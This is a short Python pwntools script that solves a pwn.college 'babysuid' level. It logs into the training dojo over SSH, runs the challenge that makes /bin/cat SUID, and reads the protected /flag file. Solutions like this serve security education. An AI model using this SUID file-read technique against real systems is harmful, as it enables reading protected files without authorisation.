from pwn import ssh, context

# Set the logging level
context.log_level = "info"

# Connect to pwn.college SSH
s = ssh(host="dojo.pwn.college", user="hacker", raw=True)

# First run /challenge/babysuid_level1 to make /bin/cat SUID
s.process("/challenge/babysuid_level1")

# Now run /bin/cat /flag
print(s.process(["/bin/cat", "/flag"]).recvall().decode())

# Close the SSH connection
s.close()
